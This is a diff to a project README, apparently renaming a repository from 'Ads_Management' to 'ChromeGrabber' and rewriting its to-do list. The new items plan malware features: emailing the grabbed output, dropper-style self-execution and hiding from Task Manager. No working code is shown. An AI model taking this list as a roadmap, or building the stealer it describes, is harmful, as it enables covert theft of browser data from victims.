@@ -25,17 +25,15 @@ Dillinger uses a number of open source projects to work properly:
 ## Installation
 
 ```sh
-git clone https://github.com/cyberdevo/Ads_Management.git
+git clone https://github.com/cyberdevo/ChromeGrabber.git
 
 Either you can use built in exe file
 ```
 ### Task ToDo
 
-- [x] Ads Manipulation
-- [x] Make Anti Ads Boom
+- [ ] Should have to bind with email and send it.
+- [ ] Self Execution should have to be done like a dropper
 - [ ] Hide From Task Manager
-- [ ] Bind With file and send it using email
-- [ ] Add Custom Payload
 
 ## License
 
